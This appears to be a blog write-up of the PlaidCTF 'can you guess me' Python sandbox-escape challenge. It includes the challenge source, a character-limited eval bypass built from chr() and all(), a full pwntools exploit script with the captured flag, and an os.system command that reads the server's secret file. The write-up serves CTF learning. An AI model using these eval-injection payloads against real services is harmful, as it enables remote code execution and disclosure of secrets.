---
layout: post
title: "[PlaidCTF] can you guess me (ver.English)"
comments: true
excerpt_separator: <!--more-->
tags:
  - Write-up
  - CTF
  - English
  - MyriaBreak
---

```
Here's the source to a guessing game: here
You can access the server at
nc canyouguessme.pwni.ng 12349
```

The challenge itself is a simple `Python Sandbox Escape`. The source of the challenge is shown below.

<!--more-->

```python
from sys import exit
from secret import secret_value_for_password, flag, exec

print(r"")
print(r"")
print(r"  ____         __   __           ____                     __  __       ")
print(r" / ___|__ _ _ _\ \ / /__  _   _ / ___|_   _  ___  ___ ___|  \/  | ___  ")
print(r"| |   / _` | '_ \ V / _ \| | | | |  _| | | |/ _ \/ __/ __| |\/| |/ _ \ ")
print(r"| |__| (_| | | | | | (_) | |_| | |_| | |_| |  __/\__ \__ \ |  | |  __/ ")
print(r" \____\__,_|_| |_|_|\___/ \__,_|\____|\__,_|\___||___/___/_|  |_|\___| ")
print(r"                                                                       ")
print(r"")
print(r"")

try:
    val = 0
    inp = input("Input value: ")
    count_digits = len(set(inp))
    if count_digits <= 10:          # Make sure it is a number
        val = eval(inp)
    else:
        raise

    if val == secret_value_for_password:
        print(flag)
    else:
        print("Nope. Better luck next time.")
except:
    print("Nope. No hacking.")
    exit(1)
```

It takes input from the user and executes it through `eval (inp)`. There are restrictions on the maximum of 10 unique characters used for input.

The `eval()` function, which is `Built-in Functions` of` python`, returns the result of executing `python` for the input string. `Built-in Functions` function` exec()`, which operates like` eval() `, is imported from` secret` and can not be used.

```

  ____         __   __           ____                     __  __       
 / ___|__ _ _ _\ \ / /__  _   _ / ___|_   _  ___  ___ ___|  \/  | ___  
| |   / _` | '_ \ V / _ \| | | | |  _| | | |/ _ \/ __/ __| |\/| |/ _ \
| |__| (_| | | | | | (_) | |_| | |_| | |_| |  __/\__ \__ \ |  | |  __/
 \____\__,_|_| |_|_|\___/ \__,_|\____|\__,_|\___||___/___/_|  |_|\___|


Input value: exec("1+1")

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@                                      @@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@   @@@@@@@@@@@@@  @@@@@@@@@    %@@@@@@@@@        @@@@@@@@@@@@@@@@
@@@@@@@@@@@@  @@@@@@@@@@  @@@@@@@        @@@@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@
@@@@@@@@@@%  @@@@@@@@ @@@, @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@@@@@@@@
@@@@@@@@@  @@@@@@@ @@@ @@  @@@@@@@@@@@ @@@@@@@@@@% (@@@@@@@ (@@@@@@@@  (@@@@@@@
@@@@@@@@  @@@@@@@@@@@@*@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@ @@@@@@@  @@@@@@@
@@@@@@@  @@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@  @@@@@@@
@@@@@*  @@@@@@@@@@@@@@@          @@    @@@@@@@@@@@&@@#       @@@@@@@@@@   @@@@@
@@@   ,@@&(%@@@@@ @@@              @@@@  @@@@@@@@@             @     .@@@   @@@
@&  @@@@@@      @@@@@@@@@@@@@ @@@@@     @@@@@@@,     #@@@@@@@@@@@@@@@@@@ @@  @@
  @.@@@   @@@@@@     @@@@#   @@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@@@@     %@@&@ @  @
 @@ @@  @@@@@  @@@@@@@%,(@@@@@@@@@@@@@@@@@@@@@@@@. @@@@@@@      .@@@@  @ @@@  @
 @@ @@ @@@@@      @@@@@@@@@@@@@@@@ @@   @@@@@@@@@@@   @@@@@@@@@@@( @@@@@@@@@  @
 @@ @@  @     @@@@    (@@@@@(@@@@@@  @@@@@@@@@@@@@@@@    @@@@@@@@   @@@ @@   @@
  @@@@* @@@@@  @@@@@@       @@@@@@@  @@      @@@@@@@  @ @@@ @@@@    @@@@ @  @@@
@  @@ @@@@@@@     @@@@ @@@@@       @@@@@@@@@@@@     @@@@@@@@@@       @@@@  @@@@
@@   ,@@@@@@@@@  @       @@@@@@@@          @@@@@@@@@@@@@@       @    @@@@  @@@@
@@@@   @@@@@@@@@  @@@        @@@@  @@@@@@@@             @@  @@@  @   @@@@ @@@@@
@@@@@@  @@@@@@@@@@  @@  @@         @@@@@@@@  @@@@@, @@@@@@  @@       @@@@ @@@@@
@@@@@@@  @@@@@@@@@@    @@@@@@@@                                      @@@@ @@@@@
@@@@@@@@  @@@@@@@@@@@(  @@@@@@@@ @@@@@                               @@@& @@@@@
@@@@@@@@@/  @@@@@@@@@@@@   @@@@  @@@@@@@@@ @@@@,               &    @@@@@ @@@@@
@@@@@@@@@@@   @@@@@@@@@@@@@     @@@@@@@@@@ @@@@@@% @@@@  @@* ,@    @@@@@@ @@@@@
@@@@@@@@@@@@@   @@@ @@@@ @@@@@@      @@@@  @@@@@@  @@@  ,@@      @@@@@@@@ @@@@@
@@@@@@@@@@@@@@@@   %@@@ @@@@ @@@@@@@@@@                   .@@@@@@@@@@@@@@ @@@@@
@@@@@@@@@@@@@@@@@@@    @@@@ *@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@ @@@@@
@@@@@@@@@@@@@@@@@@@@@@@    .@@@@@ %@@@@  /@@@@@@@@@@@@@@@@@@@ @@@@@@.@@@@  @@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@&    @@@@@@@@@/  @@@@@@@@@@@@@@@@@@@@@. @@@@@@  @@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@   @@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Nope. No hacking.
```

Therefore, we can not use `exec()`. Since the character constraint is `10 characters`, we can use the `chr()`function and `1 + 1` to create all the characters.

Number of unique characters currently used: 7

```python
>>> chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)
'#'
>>> chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)
'###'
>>> len(set("chr(1+1+1)"))
7
>>>
```

Now create a `print(flag)` string and enclose it in the `eval()` function, and a `flag` will be printed. However, if you use `eval()` here, the character type is exceeded.

```python
>>> inp = "eval(chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1+1+1+1+1)+chr(111+1+1+1+1))"
>>> eval(inp)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
  File "<string>", line 1, in <module>
NameError: name 'ls' is not defined
>>> len(set(inp))
11
>>>
```

Since the unique characters is `11`, it is necessary to reduce the unique character by one. Using `exec` instead of `eval` solves the problem, but as you can see above, you can not use `exec`. You then need to use `eval` but reduce the unique characters that exist.

Here we can look at `eval` and think of the variable `val`.

```python
try:
    val = 0     # val
    inp = input("Input value: ")
    count_digits = len(set(inp))
    if count_digits <= 10:          # Make sure it is a number
        val = eval(inp)
    else:
        raise
```

Where the value of `val` is 0. However, you can use the `all` function to create a value of `True`. `True` can be used as `1`.

```python
>>> all(chr(val))
True
>>> inp = "eval(chr(all(chr(val)))+chr(all(chr(val))))"
>>> eval(inp)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
  File "<string>", line 1

    ^
SyntaxError: invalid syntax
>>> len(set(inp))
10
>>>
```

It is wonderful !! The unique characters used is just `10`. Now you can run the following command: `print(flag)`

You can create the `explotit code` below.

```python
from pwn import *

conn = remote("canyouguessme.pwni.ng", 12349)

def make_payload(command):
	payload  = "eval("
	for i in command:
		payload += "chr("
		for j in range(0, ord(i)):
			payload += "all(chr(val))+"
		payload = payload[:-1]
		payload += ")+"
	payload = payload[:-1]
	payload  += ")"
	return payload


conn.recvuntil("Input value: ")
payload = make_payload("print(flag)")
conn.sendline(payload)

conn.interactive()
```

You can get the flag by executing the above code.

```
[+] Opening connection to canyouguessme.pwni.ng on port 12349: Done
[*] Switching to interactive mode
PCTF{hmm_so_you_were_Able_2_g0lf_it_down?_Here_have_a_flag}
Nope. Better luck next time.
[*] Got EOF while reading in interactive
$  
```

In addition, you can run `__import__("os").system("cat /home/guessme/secret.py")` to see `secret.py` as a whole.

## unintend solution

After the competition, I realized that there was an `unintend solution` through other people's write-ups. `help(flag)` and `print(vars())` both consist of less than 10 unique characters.

**help(flag)**
```

  ____         __   __           ____                     __  __       
 / ___|__ _ _ _\ \ / /__  _   _ / ___|_   _  ___  ___ ___|  \/  | ___  
| |   / _` | '_ \ V / _ \| | | | |  _| | | |/ _ \/ __/ __| |\/| |/ _ \
| |__| (_| | | | | | (_) | |_| | |_| | |_| |  __/\__ \__ \ |  | |  __/
 \____\__,_|_| |_|_|\___/ \__,_|\____|\__,_|\___||___/___/_|  |_|\___|



Input value: help(flag)
No Python documentation found for 'PCTF{hmm_so_you_were_Able_2_g0lf_it_down?_Here_have_a_flag}'.
Use help() to get the interactive help utility.
Use help(str) for help on the str class.

Nope. Better luck next time.
```

**print(vars())**
```

  ____         __   __           ____                     __  __       
 / ___|__ _ _ _\ \ / /__  _   _ / ___|_   _  ___  ___ ___|  \/  | ___  
| |   / _` | '_ \ V / _ \| | | | |  _| | | |/ _ \/ __/ __| |\/| |/ _ \
| |__| (_| | | | | | (_) | |_| | |_| | |_| |  __/\__ \__ \ |  | |  __/
 \____\__,_|_| |_|_|\___/ \__,_|\____|\__,_|\___||___/___/_|  |_|\___|



Input value: print(vars())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f3fb742e9e8>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/guessme/can-you-guess-me.py', '__cached__': None, 'exit': <built-in function exit>, 'secret_value_for_password': 'not even a number; this is a damn string; and it has all 26 characters of the alphabet; abcdefghijklmnopqrstuvwxyz; lol', 'flag': 'PCTF{hmm_so_you_were_Able_2_g0lf_it_down?_Here_have_a_flag}', 'exec': <function exec at 0x7f3fb7377158>, 'val': 0, 'inp': 'print(vars())', 'count_digits': 10}
Nope. Better luck next time.
```
